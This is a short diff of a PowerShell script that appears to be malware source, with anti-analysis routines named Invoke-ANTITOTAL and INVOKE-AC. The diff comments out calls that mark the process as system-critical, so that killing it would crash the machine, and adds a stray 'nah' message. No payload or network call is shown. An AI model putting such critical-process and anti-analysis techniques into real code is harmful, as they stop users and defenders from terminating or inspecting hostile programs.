@@ -250,7 +250,7 @@ function Invoke-ANTITOTAL {
         }
     } 
 
-    [ProcessUtility]::MakeProcessCritical()
+    #[ProcessUtility]::MakeProcessCritical()
     Invoke-TASKS
 }
 
@@ -1285,7 +1285,8 @@ if (INVOKE-AC -eq $true) {
     if ($debug) {
         Start-Sleep -Seconds 50
     } else {
-        [ProcessUtility]::MakeProcessKillable()
+        #[ProcessUtility]::MakeProcessKillable()
+        Write-Host "nah"
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
